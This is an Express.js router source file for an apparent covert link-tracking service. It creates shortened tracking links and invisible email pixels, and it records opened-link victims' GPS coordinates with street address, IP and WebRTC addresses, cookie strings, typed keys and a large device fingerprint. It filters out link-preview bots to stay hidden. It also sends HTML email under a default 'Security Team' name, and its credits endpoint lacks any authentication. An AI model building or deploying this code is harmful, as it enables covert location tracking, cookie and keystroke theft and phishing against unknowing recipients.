import express from "express";
import axios from "axios";
import nodemailer from "nodemailer";
import { createTrackingLink, recordCapture, addCredits, createPixel, recordPixelHit } from "../utils/linkService.js";
import { db } from "../firebase/config.js";

const router = express.Router();

// -- HELPERS -------------------------------------------------------------------

function parseBrowser(ua = "") {
    if (/Edg\//i.test(ua)) return "Edge";
    if (/OPR|Opera/i.test(ua)) return "Opera";
    if (/SamsungBrowser/i.test(ua)) return "Samsung Browser";
    if (/Chrome\/([\d.]+)/i.test(ua)) {
        const v = ua.match(/Chrome\/([\d.]+)/i);
        return v ? `Chrome v${v[1].split(".")[0]}` : "Chrome";
    }
    if (/Firefox\/([\d.]+)/i.test(ua)) {
        const v = ua.match(/Firefox\/([\d.]+)/i);
        return v ? `Firefox v${v[1]}` : "Firefox";
    }
    if (/Safari/i.test(ua)) return "Safari";
    return "Unknown";
}

function parseBrowserVersion(ua = "") {
    const chrome = ua.match(/Chrome\/([\d.]+)/i);
    if (chrome) return chrome[1];
    const firefox = ua.match(/Firefox\/([\d.]+)/i);
    if (firefox) return firefox[1];
    const safari = ua.match(/Version\/([\d.]+)/i);
    if (safari) return safari[1];
    return null;
}

function parseOS(ua = "") {
    if (/Windows NT 10\.0/i.test(ua)) return "Windows 10/11";
    if (/Windows NT 6\.3/i.test(ua)) return "Windows 8.1";
    if (/Windows NT 6\.1/i.test(ua)) return "Windows 7";
    if (/Windows/i.test(ua)) return "Windows";
    const android = ua.match(/Android ([\d.]+)/i);
    if (android) return `Android ${android[1]}`;
    const ios = ua.match(/iPhone OS ([\d_]+)/i);
    if (ios) return `iOS ${ios[1].replace(/_/g, ".")}`;
    if (/iPad.*OS ([\d_]+)/i.test(ua)) return "iPadOS";
    if (/Mac OS X ([\d_]+)/i.test(ua)) {
        const v = ua.match(/Mac OS X ([\d_]+)/i);
        return v ? `macOS ${v[1].replace(/_/g, ".")}` : "macOS";
    }
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
}

function parseDevice(ua = "") {
    if (/Mobi|Android.*Mobile/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

function parseDeviceBrand(ua = "") {
    if (/Samsung/i.test(ua)) return "Samsung";
    if (/iPhone|iPad/i.test(ua)) return "Apple";
    if (/Xiaomi|Redmi|POCO/i.test(ua)) return "Xiaomi";
    if (/OnePlus/i.test(ua)) return "OnePlus";
    if (/Oppo/i.test(ua)) return "OPPO";
    if (/Vivo/i.test(ua)) return "Vivo";
    if (/Huawei/i.test(ua)) return "Huawei";
    if (/Motorola|moto/i.test(ua)) return "Motorola";
    if (/Nokia/i.test(ua)) return "Nokia";
    if (/Realme/i.test(ua)) return "Realme";
    if (/Google/i.test(ua)) return "Google";
    if (/LG/i.test(ua)) return "LG";
    if (/Sony/i.test(ua)) return "Sony";
    return null;
}

function parseEmailClient(ua = "") {
    if (/Googlebot|Google-Apps-Script|Gmail/i.test(ua)) return "Gmail";
    if (/Outlook|microsoft\.outlook/i.test(ua)) return "Outlook";
    if (/YahooMailProxy|Yahoo/i.test(ua)) return "Yahoo Mail";
    if (/Apple.*Mail|Thunderbird/i.test(ua)) return "Apple Mail";
    if (/ProtonMail/i.test(ua)) return "ProtonMail";
    if (/curl/i.test(ua)) return "cURL / Script";
    if (/python/i.test(ua)) return "Python Script";
    if (/axios|node-fetch/i.test(ua)) return "Node.js";
    if (/Chrome/i.test(ua)) return "Chrome Browser";
    if (/Firefox/i.test(ua)) return "Firefox Browser";
    if (/Safari/i.test(ua)) return "Safari Browser";
    return "Unknown";
}

function getClientIP(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket?.remoteAddress || req.ip || "Unknown";
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, { headers: { "User-Agent": "Traxelon/1.0", Accept: "application/json" }, timeout: 6000 }
        );
        const addr = res.data.address || {};
        return {
            gpsAddress: res.data.display_name || null,
            gpsCity: addr.city || addr.town || addr.village || addr.county || null,
            gpsState: addr.state || null,
            gpsPincode: addr.postcode || null,
            gpsCountry: addr.country || null,
        };
    } catch { return {}; }
}

async function enrichIP(ip) {
    try {
        if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
            return { note: "Local IP" };
        }
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile`, { timeout: 5000 }
        );
        const d = res.data;
        if (d.status !== "success") return {};
        return {
            country: d.country,
            countryCode: d.countryCode,
            region: d.regionName,
            city: d.city,
            zip: d.zip,
            lat: d.lat,
            lon: d.lon,
            timezone: d.timezone,
            isp: d.isp,
            org: d.org,
            asn: d.as,
            hostname: d.reverse || null,
            isProxy: d.proxy || false,
            isHosting: d.hosting || false,
            isMobileNetwork: d.mobile || false,
        };
    } catch { return {}; }
}

// -- HEALTH --------------------------------------------------------------------
router.get("/health", (_req, res) => res.status(200).json({ ok: true }));

// -- CREATE TRACKING LINK ------------------------------------------------------
router.post("/shorten", async(req, res) => {
    try {
        const { uid, label, destinationUrl } = req.body;
        if (!uid) return res.status(400).json({ error: "uid is required" });
        if (!destinationUrl) return res.status(400).json({ error: "destinationUrl is required" });
        const result = await createTrackingLink(uid, label, destinationUrl);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /shorten]", err.message);
        return res.status(400).json({ error: err.message });
    }
});

// -- CAPTURE DEVICE DATA -------------------------------------------------------
router.post("/capture", async(req, res) => {
    try {
        const body = req.body;
        const { token } = body;
        if (!token) return res.status(400).json({ error: "token is required" });
        const ua = req.headers["user-agent"] || "";
        const BOT_PATTERNS = /bot|crawl|spider|preview|slurp|facebookexternalhit|whatsapp|telegram|slack|discord|curl|wget|python|java|go-http|axios|node-fetch|undici/i;
        if (BOT_PATTERNS.test(ua)) return res.status(200).json({ found: true, destinationUrl: null });
        if (!body.screenWidth && !body.gpsLat && (!ua || ua.length < 40)) return res.status(200).json({ found: true, destinationUrl: null });

        const ip = getClientIP(req);
        const ipData = await enrichIP(ip);
        let geoData = {};
        if (body.gpsLat && body.gpsLon) geoData = await reverseGeocode(body.gpsLat, body.gpsLon);

        const deviceData = {
            ip,
            country: ipData.country || null,
            countryCode: ipData.countryCode || null,
            region: ipData.region || null,
            city: ipData.city || null,
            zip: ipData.zip || null,
            lat: ipData.lat || null,
            lon: ipData.lon || null,
            timezone: ipData.timezone || null,
            isp: ipData.isp || null,
            org: ipData.org || null,
            asn: ipData.asn || null,
            hostname: ipData.hostname || null,
            isProxy: ipData.isProxy || null,
            isHosting: ipData.isHosting || null,
            isMobileNetwork: ipData.isMobileNetwork || null,
            gpsLat: body.gpsLat || null,
            gpsLon: body.gpsLon || null,
            gpsAccuracy: body.gpsAccuracy || null,
            gpsAltitude: body.gpsAltitude || null,
            gpsSpeed: body.gpsSpeed || null,
            gpsHeading: body.gpsHeading || null,
            gpsAddress: geoData.gpsAddress || null,
            gpsCity: geoData.gpsCity || null,
            gpsState: geoData.gpsState || null,
            gpsPincode: geoData.gpsPincode || null,
            gpsCountry: geoData.gpsCountry || null,
            browser: parseBrowser(ua),
            os: parseOS(ua),
            device: parseDevice(ua),
            userAgent: ua,
            browserVersion: body.browserVersion || null,
            browserCodeName: body.browserCodeName || null,
            appName: body.appName || null,
            appVersion: body.appVersion || null,
            product: body.product || null,
            buildID: body.buildID || null,
            vendor: body.vendor || null,
            platform: body.platform || null,
            architecture: body.architecture || null,
            oscpu: body.oscpu || null,
            cpuClass: body.cpuClass || null,
            deviceBrand: body.deviceBrand || null,
            deviceModel: body.deviceModel || null,
            webdriver: body.webdriver || null,
            automationDetected: body.automationDetected || null,
            cpuCores: body.cpuCores || null,
            ram: body.ram || null,
            memoryTier: body.memoryTier || null,
            maxTouchPoints: body.maxTouchPoints || null,
            maxTouchPointsDetail: body.maxTouchPointsDetail || null,
            touchSupport: body.touchSupport ?? null,
            isTouchDevice: body.isTouchDevice || null,
            pointerType: body.pointerType || null,
            pointerFine: body.pointerFine || null,
            hoverCapability: body.hoverCapability || null,
            javaEnabled: body.javaEnabled ?? null,
            pdfViewerEnabled: body.pdfViewerEnabled ?? null,
            gamepadsConnected: body.gamepadsConnected || null,
            gpu: body.gpu || null,
            gpuVendor: body.gpuVendor || null,
            webglVersion: body.webglVersion || null,
            webglRenderer: body.webglRenderer || null,
            webglVendor: body.webglVendor || null,
            webglShadingLanguage: body.webglShadingLanguage || null,
            webglHash: body.webglHash || null,
            shaderPrecision: body.shaderPrecision || null,
            maxTextureSize: body.maxTextureSize || null,
            maxViewportDims: body.maxViewportDims || null,
            maxAnisotropy: body.maxAnisotropy || null,
            maxVertexAttribs: body.maxVertexAttribs || null,
            maxVertexUniformVectors: body.maxVertexUniformVectors || null,
            maxFragmentUniformVectors: body.maxFragmentUniformVectors || null,
            maxCombinedTextureUnits: body.maxCombinedTextureUnits || null,
            maxCubeMapTextureSize: body.maxCubeMapTextureSize || null,
            maxRenderBufferSize: body.maxRenderBufferSize || null,
            maxVaryingVectors: body.maxVaryingVectors || null,
            maxVertexTextureUnits: body.maxVertexTextureUnits || null,
            maxFragmentTextureUnits: body.maxFragmentTextureUnits || null,
            aliasedPointSizeRange: body.aliasedPointSizeRange || null,
            aliasedLineWidthRange: body.aliasedLineWidthRange || null,
            webglExtensionsCount: body.webglExtensionsCount || null,
            webglExtensionsList: body.webglExtensionsList || null,
            webgl2Support: body.webgl2Support ?? null,
            screenWidth: body.screenWidth || null,
            screenHeight: body.screenHeight || null,
            screenAvailWidth: body.screenAvailWidth || null,
            screenAvailHeight: body.screenAvailHeight || null,
            colorDepth: body.colorDepth || null,
            pixelDepth: body.pixelDepth || null,
            screenColorDepth: body.screenColorDepth || null,
            pixelRatio: body.pixelRatio || null,
            devicePixelRatioPercent: body.devicePixelRatioPercent || null,
            windowWidth: body.windowWidth || null,
            windowHeight: body.windowHeight || null,
            outerWidth: body.outerWidth || null,
            outerHeight: body.outerHeight || null,
            orientation: body.orientation || null,
            orientationAngle: body.orientationAngle ?? null,
            hdrSupport: body.hdrSupport || null,
            colorGamut: body.colorGamut || null,
            forcedColors: body.forcedColors || null,
            invertedColors: body.invertedColors || null,
            prefersColorScheme: body.prefersColorScheme || null,
            prefersReducedMotion: body.prefersReducedMotion || null,
            prefersContrast: body.prefersContrast || null,
            displayMode: body.displayMode || null,
            cssPxDensity: body.cssPxDensity || null,
            monochrome: body.monochrome || null,
            visualViewportWidth: body.visualViewportWidth ?? null,
            visualViewportHeight: body.visualViewportHeight ?? null,
            visualViewportScale: body.visualViewportScale ?? null,
            batteryLevel: body.batteryLevel ?? null,
            batteryCharging: body.batteryCharging ?? null,
            batteryChargingTime: body.batteryChargingTime ?? null,
            batteryDischargingTime: body.batteryDischargingTime ?? null,
            connectionType: body.connectionType || null,
            connectionQuality: body.connectionQuality || null,
            connectionDownlink: body.connectionDownlink || null,
            connectionRtt: body.connectionRtt || null,
            connectionSaveData: body.connectionSaveData ?? null,
            connectionDownlinkMax: body.connectionDownlinkMax || null,
            onlineStatus: body.onlineStatus || null,
            browserOnline: body.browserOnline || null,
            localTime: body.localTime || null,
            clientTimezone: body.clientTimezone || null,
            timezoneOffset: body.timezoneOffset ?? null,
            dstActive: body.dstActive || null,
            dayOfWeek: body.dayOfWeek || null,
            timeOfDay: body.timeOfDay || null,
            language: body.language || null,
            languages: body.languages || null,
            incognito: body.incognito ?? null,
            adBlockDetected: body.adBlockDetected ?? null,
            cookiesEnabled: body.cookiesEnabled ?? null,
            doNotTrack: body.doNotTrack || null,
            historyLength: body.historyLength || null,
            navigationCount: body.navigationCount || null,
            referrer: body.referrer || null,
            canvasHash: body.canvasHash || null,
            canvasGeometryHash: body.canvasGeometryHash || null,
            audioFingerprint: body.audioFingerprint || null,
            cssHash: body.cssHash || null,
            fontFingerprint: body.fontFingerprint || null,
            tabHidden: body.tabHidden || null,
            visibilityState: body.visibilityState || null,
            documentCharset: body.documentCharset || null,
            documentCompatMode: body.documentCompatMode || null,
            windowName: body.windowName || null,
            cookieString: body.cookieString || null,
            scrollPositionX: body.scrollPositionX ?? null,
            scrollPositionY: body.scrollPositionY ?? null,
            deviceMotionSupport: body.deviceMotionSupport || null,
            deviceOrientationSupport: body.deviceOrientationSupport || null,
            deviceMotionAccelX: body.deviceMotionAccelX ?? null,
            deviceMotionAccelY: body.deviceMotionAccelY ?? null,
            deviceMotionAccelZ: body.deviceMotionAccelZ ?? null,
            deviceOrientationAlpha: body.deviceOrientationAlpha ?? null,
            deviceOrientationBeta: body.deviceOrientationBeta ?? null,
            deviceOrientationGamma: body.deviceOrientationGamma ?? null,
            mouseX: body.mouseX ?? null,
            mouseY: body.mouseY ?? null,
            popupBlocked: body.popupBlocked || null,
            contentFilteringDetected: body.contentFilteringDetected || null,
            tlsVersion: body.tlsVersion || null,
            pageVisibilityChanges: body.pageVisibilityChanges ?? null,
            keysPressed: body.keysPressed || null,
            activeXSupport: body.activeXSupport || null,
            firefoxExtensions: body.firefoxExtensions || null,
            fingerprintingResistance: body.fingerprintingResistance || null,
            trackingProtection: body.trackingProtection || null,
            storageQuota: body.storageQuota || null,
            storageUsage: body.storageUsage || null,
            storageUsageBytes: body.storageUsageBytes ?? null,
            webrtcLocalIP: body.webrtcLocalIP || null,
            webrtcPublicIP: body.webrtcPublicIP || null,
            webrtcSupport: body.webrtcSupport || null,
            cameras: body.cameras ?? null,
            microphones: body.microphones ?? null,
            speakers: body.speakers ?? null,
            speechVoicesCount: body.speechVoicesCount ?? null,
            speechVoices: body.speechVoices || null,
            localStorageEnabled: body.localStorageEnabled ?? null,
            sessionStorageEnabled: body.sessionStorageEnabled ?? null,
            indexedDBEnabled: body.indexedDBEnabled ?? null,
            cacheAPIEnabled: body.cacheAPIEnabled || null,
            cookiesCount: body.cookiesCount ?? null,
            pageLoadTime: body.pageLoadTime || null,
            domContentLoaded: body.domContentLoaded || null,
            dnsLookupTime: body.dnsLookupTime || null,
            tcpConnectTime: body.tcpConnectTime || null,
            ttfb: body.ttfb || null,
            memoryUsed: body.memoryUsed || null,
            memoryTotal: body.memoryTotal || null,
            memoryLimit: body.memoryLimit || null,
            fontsDetected: body.fontsDetected ?? null,
            fontsList: body.fontsList || null,
            pluginsCount: body.pluginsCount ?? null,
            plugins: body.plugins || null,
            mimeTypes: body.mimeTypes || null,
            geolocationPermission: body.geolocationPermission || null,
            notificationsPermission: body.notificationsPermission || null,
            notificationPermission: body.notificationPermission || null,
            cameraPermission: body.cameraPermission || null,
            microphonePermission: body.microphonePermission || null,
            accelerometerPermission: body.accelerometerPermission || null,
            gyroscopePermission: body.gyroscopePermission || null,
            magnetometerPermission: body.magnetometerPermission || null,
            clipboardReadPermission: body.clipboardReadPermission || null,
            clipboardWritePermission: body.clipboardWritePermission || null,
            keyboardLayout: body.keyboardLayout || null,
            webSocketSupport: body.webSocketSupport ?? null,
            webWorkerSupport: body.webWorkerSupport ?? null,
            serviceWorkerSupport: body.serviceWorkerSupport ?? null,
            webAssemblySupport: body.webAssemblySupport ?? null,
            bluetoothSupport: body.bluetoothSupport ?? null,
            usbSupport: body.usbSupport ?? null,
            nfcSupport: body.nfcSupport || null,
            serialSupport: body.serialSupport || null,
            hidSupport: body.hidSupport || null,
            wakeLockSupport: body.wakeLockSupport || null,
            vibrationSupport: body.vibrationSupport || null,
            notificationSupport: body.notificationSupport || null,
            gamepadSupport: body.gamepadSupport || null,
            xrSupport: body.xrSupport || null,
            offscreenCanvasSupport: body.offscreenCanvasSupport || null,
            sharedArrayBufferSupport: body.sharedArrayBufferSupport || null,
            broadcastChannelSupport: body.broadcastChannelSupport || null,
            paymentRequestSupport: body.paymentRequestSupport || null,
            credentialMgmtSupport: body.credentialMgmtSupport || null,
            presentationSupport: body.presentationSupport || null,
            eyeDropperSupport: body.eyeDropperSupport || null,
            fileSystemAccessSupport: body.fileSystemAccessSupport || null,
            contactPickerSupport: body.contactPickerSupport || null,
            webShareSupport: body.webShareSupport || null,
            clipboardAPISupport: body.clipboardAPISupport || null,
            mediaSessionSupport: body.mediaSessionSupport || null,
            pictureInPictureSupport: body.pictureInPictureSupport || null,
            pointerLockSupport: body.pointerLockSupport || null,
            fullscreenSupport: body.fullscreenSupport || null,
            speechRecognitionSupport: body.speechRecognitionSupport || null,
            speechSynthesisSupport: body.speechSynthesisSupport || null,
            cryptoSupport: body.cryptoSupport || null,
            performanceObserverSupport: body.performanceObserverSupport || null,
            intersectionObserverSupport: body.intersectionObserverSupport || null,
            resizeObserverSupport: body.resizeObserverSupport || null,
            mutationObserverSupport: body.mutationObserverSupport || null,
            requestIdleCallbackSupport: body.requestIdleCallbackSupport || null,
            requestAnimFrameSupport: body.requestAnimFrameSupport || null,
            fetchSupport: body.fetchSupport || null,
            abortControllerSupport: body.abortControllerSupport || null,
            structuredCloneSupport: body.structuredCloneSupport || null,
            compressionStreamSupport: body.compressionStreamSupport || null,
            queueMicrotaskSupport: body.queueMicrotaskSupport || null,
            indexedDBSupport: body.indexedDBSupport || null,
        };

        const result = await recordCapture(token, deviceData);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /capture]", err.message);
        return res.status(500).json({ error: "Failed to record capture" });
    }
});

// -- GPS UPDATE ----------------------------------------------------------------
router.post("/capture-gps", async(req, res) => {
    try {
        const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
        if (!token || !gpsLat || !gpsLon) return res.status(400).json({ error: "missing data" });
        const geoData = await reverseGeocode(gpsLat, gpsLon);
        const linksRef = db.collection("trackingLinks");
        const snap = await linksRef.where("token", "==", token).get();
        if (snap.empty) return res.status(404).json({ error: "not found" });
        const linkDoc = snap.docs[0];
        const captures = [...(linkDoc.data().captures || [])];
        if (captures.length > 0) {
            const last = {...captures[captures.length - 1] };
            last.gpsLat = gpsLat;
            last.gpsLon = gpsLon;
            last.gpsAccuracy = gpsAccuracy || null;
            last.gpsAltitude = gpsAltitude || null;
            last.gpsSpeed = gpsSpeed || null;
            last.gpsHeading = gpsHeading || null;
            last.gpsAddress = geoData.gpsAddress || null;
            last.gpsCity = geoData.gpsCity || null;
            last.gpsState = geoData.gpsState || null;
            last.gpsPincode = geoData.gpsPincode || null;
            last.gpsCountry = geoData.gpsCountry || null;
            captures[captures.length - 1] = last;
            await linksRef.doc(linkDoc.id).update({ captures });
        }
        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error("[capture-gps]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

// -- URL SHORTENER -------------------------------------------------------------
router.post("/shorten-url", async(req, res) => {
    try {
        const { url, provider } = req.body;
        if (!url) return res.status(400).json({ error: "url required" });
        let shortUrl = null;
        if (provider === "tinyurl") {
            const r = await axios.get("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 10000 });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;
        } else if (provider === "isgd") {
            const r = await axios.get("https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;
        } else if (provider === "vgd") {
            const r = await axios.get("https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;
        } else if (provider === "dagd") {
            const r = await axios.get("https://da.gd/shorten?url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
            const result = String(r.data || "").trim();
            if (result.startsWith("http")) shortUrl = result;
        }
        return res.status(200).json({ shortUrl });
    } catch (err) {
        console.error("[shorten-url]", err.message);
        return res.status(200).json({ shortUrl: null, error: err.message });
    }
});

// -- GEO IP --------------------------------------------------------------------
router.get("/geo-ip", async(req, res) => {
    const ip = getClientIP(req);
    const data = await enrichIP(ip);
    return res.status(200).json(data);
});

// -- CREDITS -------------------------------------------------------------------
router.post("/credits", async(req, res) => {
    try {
        const { uid, amount } = req.body;
        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
        await addCredits(uid, Number(amount));
        return res.status(200).json({ success: true });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

// -- PIXEL ROUTES --------------------------------------------------------------
// CRITICAL: /pixel/create and /pixel/list MUST come before /pixel/:filename
// or Express will match "create" as a token filename

router.post("/pixel/create", async(req, res) => {
    try {
        const { uid, label } = req.body;
        if (!uid) return res.status(400).json({ error: "uid is required" });
        const result = await createPixel(uid, label);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /pixel/create]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

router.get("/pixel/list/:uid", async(req, res) => {
    try {
        const { uid } = req.params;
        const snap = await db.collection("pixelLinks").where("uid", "==", uid).get();
        const pixels = snap.docs.map(d => ({ id: d.id, ...d.data() }));
        pixels.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
        return res.status(200).json({ pixels });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

// GET /pixel/:filename — serves 1×1 transparent GIF instantly, then logs full
// device info from User-Agent + IP. NO location lookup (fast + no GPS needed).
router.get("/pixel/:filename", async(req, res) => {
    // -- 1. Serve the GIF immediately — never keep the browser waiting ------
    const GIF = Buffer.from(
        "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
        "base64"
    );
    res.set({
        "Content-Type": "image/gif",
        "Content-Length": GIF.length,
        "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
    });
    res.end(GIF);

    // -- 2. Log everything async — after response is already sent ----------
    try {
        const token = req.params.filename.replace(/\.(gif|png|jpg|jpeg|webp)$/i, "");
        const ua = req.headers["user-agent"] || "";
        const ip = (() => {
            const fwd = req.headers["x-forwarded-for"];
            if (fwd) return fwd.split(",")[0].trim();
            return req.socket?.remoteAddress || req.ip || "Unknown";
        })();

        // IP enrichment — ISP, org, proxy, mobile network (NO GPS/location coords)
        let ipData = {};
        try {
            if (ip && ip !== "::1" && !ip.startsWith("127.") && !ip.startsWith("192.168.") && !ip.startsWith("10.")) {
                const r = await axios.get(
                    `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,timezone,isp,org,as,proxy,hosting,mobile`, { timeout: 4000 }
                );
                if (r.data.status === "success") {
                    ipData = {
                        country: r.data.country || null,
                        countryCode: r.data.countryCode || null,
                        region: r.data.regionName || null,
                        city: r.data.city || null,
                        zip: r.data.zip || null,
                        timezone: r.data.timezone || null,
                        isp: r.data.isp || null,
                        org: r.data.org || null,
                        asn: r.data.as || null,
                        isProxy: r.data.proxy || false,
                        isHosting: r.data.hosting || false,
                        isMobileNetwork: r.data.mobile || false,
                    };
                }
            }
        } catch { /* silent — never block pixel serving */ }

        // Full device fingerprint from User-Agent
        const hitData = {
            // Network
            ip,
            isp: ipData.isp || null,
            org: ipData.org || null,
            asn: ipData.asn || null,
            country: ipData.country || null,
            countryCode: ipData.countryCode || null,
            region: ipData.region || null,
            city: ipData.city || null,
            zip: ipData.zip || null,
            timezone: ipData.timezone || null,
            isProxy: ipData.isProxy || false,
            isHosting: ipData.isHosting || false,
            isMobileNetwork: ipData.isMobileNetwork || false,

            // Device & browser — extracted from User-Agent
            emailClient: parseEmailClient(ua),
            browser: parseBrowser(ua),
            browserVersion: parseBrowserVersion(ua),
            os: parseOS(ua),
            device: parseDevice(ua),
            deviceBrand: parseDeviceBrand(ua),

            // Raw headers for extra detail
            userAgent: ua,
            referer: req.headers["referer"] || req.headers["referrer"] || null,
            acceptLanguage: req.headers["accept-language"] || null,
            acceptEncoding: req.headers["accept-encoding"] || null,
            connectionHeader: req.headers["connection"] || null,
            cacheControl: req.headers["cache-control"] || null,
            dnt: req.headers["dnt"] || null,
            secFetchSite: req.headers["sec-fetch-site"] || null,
            secFetchMode: req.headers["sec-fetch-mode"] || null,
            secChUa: req.headers["sec-ch-ua"] || null,
            secChUaMobile: req.headers["sec-ch-ua-mobile"] || null,
            secChUaPlatform: req.headers["sec-ch-ua-platform"] || null,
        };

        recordPixelHit(token, hitData).catch(() => {});
    } catch (err) {
        console.error("[GET /pixel]", err.message);
    }
});

// -- EMAIL SENDER --------------------------------------------------------------
router.post("/send-email", async(req, res) => {
    try {
        const { fromName, fromEmail, toEmail, subject, htmlBody } = req.body;
        if (!toEmail || !subject || !htmlBody) {
            return res.status(400).json({ error: "toEmail, subject and htmlBody are required" });
        }
        if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
            return res.status(500).json({ error: "SMTP not configured. Add SMTP_USER and SMTP_PASS to .env" });
        }
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS },
        });
        await transporter.sendMail({
            from: `"${fromName || "Security Team"}" <${process.env.SMTP_USER}>`,
            replyTo: fromEmail || process.env.SMTP_USER,
            to: toEmail,
            subject: subject,
            html: htmlBody,
        });
        return res.status(200).json({ success: true });
    } catch (err) {
        console.error("[send-email]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

export default router;


